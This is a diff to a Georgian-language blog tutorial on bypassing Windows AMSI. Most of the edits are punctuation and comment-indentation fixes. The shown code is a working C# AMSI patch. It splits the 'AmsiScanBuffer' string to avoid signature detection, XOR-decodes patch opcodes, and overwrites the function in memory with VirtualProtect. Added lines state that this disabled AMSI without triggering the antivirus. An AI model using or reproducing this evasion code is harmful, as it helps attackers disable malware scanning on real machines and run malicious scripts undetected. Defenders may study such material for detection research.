@@ -8,7 +8,7 @@ draft: false
 
 
 <br><br>
-რომ დაგუგლოთ `amsi bypass` ან `amsi evasion`, უამრავ გამზადებულ “ქომანდებს” ნახავთ რომელთა ნახევარი უბრალოდ არ იმუშავებს. მიზეზი კი ის არის, რომ ანტივირუსი, რომელიც სისტემაზე არის მუდმივად განიცდის განახლებას და “მზა” ქომანდები სულაც არ არის ისეთ “მზამზარეული” როგორიც ერთი შეხედვით ჩანდა.
+რომ დაგუგლოთ `amsi bypass` ან `amsi evasion`, უამრავ გამზადებულ “ქომანდებს” ნახავთ რომელთა ნახევარი უბრალოდ არ იმუშავებს. მიზეზი კი ის არის, რომ ანტივირუსი, რომელიც სისტემაზე არის, მუდმივად განიცდის განახლებას და “მზა” ქომანდები სულაც არ არის ისეთ “მზამზარეული” როგორიც ერთი შეხედვით ჩანდა.
 
 მაგალითად, ავიღოთ ეს ქომანდი, რომელიც 2016 წელს არის დაინტიფიცირებული:
 
@@ -79,7 +79,7 @@ namespace ClassLibrary1
 {
     public class Class1
     {
-				// საჭირო WinAPI ფუნქციების დეკლარაცია
+		// საჭირო WinAPI ფუნქციების დეკლარაცია
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
         public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
 
@@ -92,20 +92,20 @@ namespace ClassLibrary1
         
         public static void runner()
         {
-						// amsi.dll მოდულის მისამართის "აღება"
+			// amsi.dll მოდულის მისამართის "აღება"
             IntPtr amsiPtr = GetModuleHandle("amsi.dll");
             StringBuilder haha = new StringBuilder();
-						// "AmsiScanBuffer" - როგორც ერთ სტრინგს, Defender აღიქვავს, როგორც მავნე signature
+			// "AmsiScanBuffer" - როგორც ერთ სტრინგს, Defender აღიქვავს, როგორც მავნე signature
             haha.Append("Am");
             haha.Append("si");
             haha.Append("Sc");
             haha.Append("an");
             haha.Append("Buffer");
 
-						// "AmsiScanBuffer" მისამართის აღება amsi.dll მოდულიდან.
+			// "AmsiScanBuffer" მისამართის აღება amsi.dll მოდულიდან.
             var amsiScanBuf = GetProcAddress(amsiPtr, haha.ToString());
 
-						// ეს hex ბაიტები იყო და-XOR-ებული 0xC სთან - ეს საჭირო იყო defender ისთვის გვერდის ავლისთვის.
+			// ეს hex ბაიტები იყო და-XOR-ებული 0xC სთან - ეს საჭირო იყო defender ისთვის გვერდის ავლისთვის.
             //new opcodes
             byte[] encodedopcodes = new byte[] { 0xB4, 0x5B, 0x0C, 0x0B, 0x8C, 0xCF };
             byte[] decodedOpcodes = new byte[6];
@@ -117,7 +117,7 @@ namespace ClassLibrary1
             }
             objList.CopyTo(decodedOpcodes);
 
-						// memory page - ისთვის შესაბამისი პერმიშენების მინიჭება
+			// memory page - ისთვის შესაბამისი პერმიშენების მინიჭება
             VirtualProtect(amsiScanBuf, (UIntPtr)encodedopcodes.Length, 0x40, out uint oldProtect);
             Marshal.Copy(decodedOpcodes, 0, amsiScanBuf, decodedOpcodes.Length);
         }
@@ -143,3 +143,25 @@ $method.Invoke(0, $null)
 ![Untitled](/images/amsi-1//Untitled%208.png)
 
 ![Untitled](/images/amsi-1//Untitled%209.png)
+
+შესაბამისად, დავინახეთ რომ პირდაპირ მემორიში "მაქინაციების" დახმარებით მივაღწიეთ მიზანს, გავთიშეთ amsi ისე, რომ ანტივირუსი არ დათრიგერდა.
+
+და ბოლოს, ყურადღებას ვამახვილებ შემდეგ კოდის ნაწილზე:
+
+
+```csharp
+ 		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
+
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+```
+
+თუ გსურთ, რომელიმე WinAPI ფუნქციის დაიმპორტება და რომ არ იწვალოთ ამ ფუნქციებისთვის დეკლარაციისთვის პარამეტრების მიწერა, შეგილიათ გამოიყენოთ ეს საიტი: https://www.pinvoke.net/
+
+
+![Untitled](/images/amsi-1/pinvoke.png)
